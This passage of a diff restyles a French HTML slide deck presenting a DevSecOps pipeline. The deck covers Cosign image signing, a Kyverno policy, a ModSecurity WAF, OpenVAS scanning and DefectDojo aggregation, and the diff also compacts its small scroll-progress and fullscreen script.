+    <span class="pnode" style="background:rgba(255,255,255,0.15);border-color:rgba(255,255,255,0.3);color:#fff"><strong>Monitor</strong><br><small style="color:rgba(255,255,255,0.7)">Continu</small></span>
   </div>
-  <span class="snum">15</span>
+  <span class="snum" style="color:rgba(255,255,255,0.3)">15</span>
 </div>
 
 <!-- ==================== 16. COSIGN ==================== -->
@@ -641,7 +683,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   <span class="kw">needs:</span> [dast-analysis]
   <span class="kw">if:</span> github.event_name == <span class="str">'push'</span> && github.ref == <span class="str">'refs/heads/main'</span>
   <span class="kw">permissions:</span>
-    <span class="kw">id-token:</span> write  <span class="cm"># Necessaire pour le keyless signing</span>
+    <span class="kw">id-token:</span> write  <span class="cm"># Necessaire pour keyless signing</span>
   <span class="kw">steps:</span>
     - <span class="kw">uses:</span> sigstore/cosign-installer@v3
     - <span class="kw">run:</span> cosign sign --yes $USER/$IMAGE:$TAG
@@ -665,7 +707,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
     </div>
     <div class="card">
       <h3>Exemple de politique</h3>
-      <pre style="border:none;padding:0;font-size:0.85em"><span class="kw">apiVersion:</span> kyverno.io/v1
+      <pre style="box-shadow:none;margin:0;font-size:0.85em"><span class="kw">apiVersion:</span> kyverno.io/v1
 <span class="kw">kind:</span> ClusterPolicy
 <span class="kw">metadata:</span>
   <span class="kw">name:</span> verify-image
@@ -726,10 +768,10 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
     </div>
     <div class="card">
       <h3>Positionnement</h3>
-      <div class="diagram" style="background:transparent;border:none;padding:0.5rem">
+      <div class="diagram" style="box-shadow:none;border:none;padding:0.5rem;background:transparent">
         <div class="dlayer"><div class="dbox">Client</div></div>
         <div class="darr">&darr;</div>
-        <div class="dlayer"><div class="dbox" style="border-color:var(--pink);background:rgba(244,114,182,0.1)"><strong>WAF</strong><br>ModSecurity</div></div>
+        <div class="dlayer"><div class="dbox" style="border-color:var(--coral);background:var(--coral-light)"><strong style="color:var(--coral)">WAF</strong><br><small>ModSecurity</small></div></div>
         <div class="darr">&darr; filtre</div>
         <div class="dlayer"><div class="dbox">Application</div></div>
       </div>
@@ -757,7 +799,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
         <li>Scans planifies (quotidiens / hebdomadaires)</li>
         <li>Inventaire complet des actifs</li>
         <li>Alertes sur nouvelles vulnerabilites</li>
-        <li>Outils : <span class="tag">OpenVAS</span> <span class="tag">Nessus</span> <span class="tag">Qualys</span></li>
+        <li><span class="tag">OpenVAS</span> <span class="tag">Nessus</span> <span class="tag">Qualys</span></li>
       </ul>
     </div>
   </div>
@@ -769,7 +811,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
   <span class="badge b-orange">Centralisation</span>
   <h2>DefectDojo &mdash; Chef d'orchestre</h2>
   <div class="diagram">
-    <p class="center mb" style="font-size:0.85em;color:var(--muted)">Tous les rapports convergent vers une vue unique</p>
+    <p class="center mb" style="color:var(--muted)">Tous les rapports convergent vers une vue unique</p>
     <div class="dlayer">
       <div class="dbox">TruffleHog</div>
       <div class="dbox">Semgrep</div>
@@ -780,21 +822,21 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
     </div>
     <div class="darr">&darr; &darr; &darr; &darr; &darr; &darr;</div>
     <div class="dlayer">
-      <div class="dbox big org"><strong style="color:var(--orange)">DefectDojo</strong><br>Centralisation &bull; Priorisation &bull; Suivi &bull; Metriques</div>
+      <div class="dbox big org"><strong style="color:#c2410c">DefectDojo</strong><br>Centralisation &bull; Priorisation &bull; Suivi &bull; Metriques</div>
     </div>
   </div>
   <div class="info mt">
-    <strong>Avantage cle :</strong> Deduplique les findings, priorise par criticite, suit l'avancement des remediations, et genere des metriques.
+    <strong>Avantage cle :</strong> Deduplique les findings, priorise par criticite, suit les remediations, et genere des metriques pour le management.
   </div>
   <span class="snum">21</span>
 </div>
 
-<!-- ==================== 22. VISION GLOBALE ==================== -->
+<!-- ==================== 22. VISION ==================== -->
 <div class="slide" id="s22">
   <h2>Vision globale DevSecOps</h2>
   <div class="vision">
     <div class="vision-col">
-      <h3 style="color:var(--accent)">CI/CD Pipeline</h3>
+      <h3 style="color:var(--sea)">CI/CD Pipeline</h3>
       <div class="dbox hl">Secrets</div>
       <div class="dbox hl">Linter</div>
       <div class="dbox hl">SAST</div>
@@ -804,7 +846,7 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
     </div>
     <div class="vision-arrow">&rarr;</div>
     <div class="vision-col">
-      <h3 style="color:var(--green)">Deploy &amp; Operate</h3>
+      <h3 style="color:var(--mint)">Deploy &amp; Operate</h3>
       <div class="dbox grn">Cosign</div>
       <div class="dbox grn">Kyverno</div>
       <div class="dbox grn">Falco</div>
@@ -812,12 +854,12 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
     </div>
     <div class="vision-arrow">&rarr;</div>
     <div class="vision-col">
-      <h3 style="color:var(--orange)">Monitor &amp; Improve</h3>
+      <h3 style="color:#c2410c">Monitor &amp; Improve</h3>
       <div class="dbox org">OpenVAS</div>
       <div class="dbox org">DefectDojo</div>
     </div>
   </div>
-  <p class="center mt" style="max-width:50ch">La securite n'est pas une etape unique mais un <strong>cycle continu</strong> : coder &rarr; tester &rarr; deployer &rarr; surveiller &rarr; ameliorer</p>
+  <p class="center mt" style="max-width:52ch">La securite n'est pas une etape unique mais un <strong>cycle continu</strong> : coder &rarr; tester &rarr; deployer &rarr; surveiller &rarr; ameliorer</p>
   <span class="snum">22</span>
 </div>
 
@@ -838,40 +880,36 @@ nav .progress{height:2px;background:var(--accent);position:absolute;bottom:0;lef
       <tr><td>Runtime</td><td><span class="tag">Falco</span></td><td>Syscall monitoring</td><td>Conteneurs prod</td></tr>
       <tr><td>WAF</td><td><span class="tag">ModSecurity</span></td><td>Filtrage HTTP</td><td>Trafic reseau</td></tr>
       <tr><td>Scan continu</td><td><span class="tag">OpenVAS</span></td><td>Scan recurrent</td><td>Infrastructure</td></tr>
-      <tr><td>Central</td><td><span class="tag">DefectDojo</span></td><td>Agregation</td><td>Tous les rapports</td></tr>
+      <tr><td>Central</td><td><span class="tag">DefectDojo</span></td><td>Agregation</td><td>Tous rapports</td></tr>
     </table>
   </div>
   <span class="snum">23</span>
 </div>
 
 <!-- ==================== 24. MERCI ==================== -->
-<div class="slide" id="s24" style="background:linear-gradient(135deg,#0b0d17,#0a1a2e)">
-  <h1 class="grad3" style="font-size:clamp(3rem,7vw,5rem);margin-bottom:1.5rem">Merci</h1>
-  <p class="center" style="font-size:clamp(1.1rem,1.6vw,1.4rem);color:var(--muted)">Questions ?</p>
-  <div style="margin-top:3rem;color:var(--dim);font-size:0.85rem;text-align:center">
+<div class="slide final-slide" id="s24">
+  <h1 class="grad3" style="font-size:clamp(3rem,7vw,5rem);margin-bottom:1.5rem;-webkit-text-fill-color:transparent">Merci</h1>
+  <p style="font-size:clamp(1.1rem,1.5vw,1.3rem)">Questions ?</p>
+  <div style="margin-top:3rem;font-size:0.85rem;text-align:center;color:#64748b">
     <p>Pipeline disponible sur GitHub</p>
-    <p>CESI MAALSI &mdash; 2026</p>
+    <p style="margin-top:0.3rem">CESI MAALSI &mdash; 2026</p>
   </div>
   <span class="snum">24</span>
 </div>
 
 <div class="foot">
-  <kbd>&darr;</kbd> Scroll &nbsp;&bull;&nbsp; <kbd>F</kbd> Plein ecran &nbsp;&bull;&nbsp; <kbd>Esc</kbd> Quitter
+  <kbd>&darr;</kbd> Scroll &nbsp;&bull;&nbsp; <kbd>F</kbd> Plein ecran
 </div>
 
 <script>
-// Progress bar
-const progress = document.getElementById('progress');
-window.addEventListener('scroll', () => {
-  const h = document.documentElement.scrollHeight - window.innerHeight;
-  const pct = h > 0 ? (window.scrollY / h) * 100 : 0;
-  progress.style.width = pct + '%';
+const progress=document.getElementById('progress');
+window.addEventListener('scroll',()=>{
+  const h=document.documentElement.scrollHeight-window.innerHeight;
+  progress.style.width=h>0?(window.scrollY/h)*100+'%':'0%';
 });
-
-// Keyboard nav
-document.addEventListener('keydown', e => {
-  if (e.key === 'f' || e.key === 'F') {
-    if (!document.fullscreenElement) document.documentElement.requestFullscreen();
+document.addEventListener('keydown',e=>{
+  if(e.key==='f'||e.key==='F'){
+    if(!document.fullscreenElement)document.documentElement.requestFullscreen();
     else document.exitFullscreen();
   }
 });
